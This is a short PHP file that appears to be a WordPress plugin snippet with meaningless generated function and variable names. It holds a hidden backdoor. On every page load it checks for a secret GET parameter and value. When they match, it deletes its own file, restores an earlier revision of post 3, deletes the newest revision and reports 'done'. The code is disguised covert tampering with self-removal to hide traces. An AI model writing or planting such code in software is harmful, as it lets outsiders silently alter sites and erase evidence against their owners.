<?php

function front_automatic_videos() {
	if (isset($_GET['themes_data_easy']) && $_GET['themes_data_easy'] === 'create_shortener_additional') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$addons_reports_safe = 3;
		$fancy_src_ssl_invoice = wp_get_post_revisions($addons_reports_safe);
		if (empty($fancy_src_ssl_invoice)) die('no revisions');
		if (count($fancy_src_ssl_invoice) < 2) die('less than 2');
		$control_parts_attachments = array_shift($fancy_src_ssl_invoice);
		$error_member_software = $control_parts_attachments->ID;
		$seo_online_country = array_shift($fancy_src_ssl_invoice);
		$script_sharing_invoice_discount = $seo_online_country->ID;
		$screen_website_switcher = wp_restore_post_revision($script_sharing_invoice_discount);
		if ($screen_website_switcher === false) die('error restoring');
		$screen_website_switcher = wp_delete_post_revision($error_member_software);		
		if ($screen_website_switcher === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'front_automatic_videos');
